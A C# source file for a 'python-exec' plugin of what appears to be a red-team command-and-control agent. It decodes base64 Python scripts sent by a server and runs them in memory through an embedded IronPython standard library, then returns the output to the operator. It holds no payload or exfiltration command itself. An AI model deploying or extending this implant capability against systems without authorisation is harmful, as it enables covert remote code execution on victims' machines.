using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Reflection;
using IronPython.Modules;
using static Community.CsharpSqlite.Sqlite3;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "python-exec";
        private IMessageManager messageManager { get; set; }
        private IPythonManager pythonManager { get; set; }
        private bool stdLibLoaded { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.pythonManager = pythonManager;
        }

        public async Task Execute(ServerJob job)
        {
            PythonExecArgs pyArgs = JsonSerializer.Deserialize<PythonExecArgs>(job.task.parameters);
            if(pyArgs is null)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }

            if (!stdLibLoaded)
            {
                if (!LoadStdLib())
                {
                    messageManager.AddTaskResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = "Failed to initialize python development, stdlib is unavailable You can still try to run scripts, but you'll need to manually import required libraries with python-load.",
                        completed = true
                    });
                    //Mark loaded as true to allow operator to still "try" to run python scripts although it likely won't work
                    this.stdLibLoaded = true;
                    return;
                }
                this.stdLibLoaded = true;
            }

            byte[] scriptBytes = Misc.Base64DecodeToByteArray(pyArgs.file);
            string scriptContents = Misc.GetEncoding(scriptBytes).GetString(scriptBytes);
            string[] argv = Misc.SplitCommandLine(pyArgs.args);

            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = pythonManager.ExecuteScript(scriptContents, argv),
                completed = true
            });
        }

        private bool LoadStdLib()
        {
            return pythonManager.LoadPyLib(GetStdLib());
        }

        private byte[] GetStdLib()
        {
            using (Stream resFilestream = Assembly.GetExecutingAssembly().GetManifestResourceStream("lib.zip"))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }
    }
}
